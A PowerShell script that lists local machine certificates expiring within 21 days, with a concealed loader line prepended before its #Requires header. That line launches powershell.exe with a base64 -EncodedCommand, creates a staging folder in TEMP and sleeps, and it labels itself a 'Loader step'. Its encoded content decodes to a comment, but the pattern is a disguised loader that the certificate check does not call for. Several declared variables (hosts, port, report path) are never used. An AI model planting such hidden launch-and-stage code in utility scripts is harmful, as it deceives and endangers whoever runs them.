try { $EncodedCommand = "IwAgAGwAZQBnAGEAYwB5ACAAQQBNAFMASQAgAG0AYQByAGsAZQByACAAawBlAHAAdAAgAGYAbwByACAAcwBpAGcAbgBhAHQAdQByAGUAIABjAG8AdgBlAHIAYQBnAGUA"; Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoP -EncodedCommand " + $EncodedCommand) -ErrorAction SilentlyContinue; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Start-Sleep -Seconds 45 } catch { Write-Warning "Loader step failed" }
#Requires -Version 5.1
$ErrorActionPreference = "Stop"
$WarningDays = 21
$Hosts       = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port        = 9443
$ReportPath  = "C:\Reports\cert-expiry-2025-10-04.csv"


$warnDate = (Get-Date).AddDays($WarningDays)
$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
    Where-Object { $_.NotAfter -lt $warnDate } |
    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
$expiring | Format-Table -AutoSize
if (@($expiring).Count -gt 0) {
    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
}
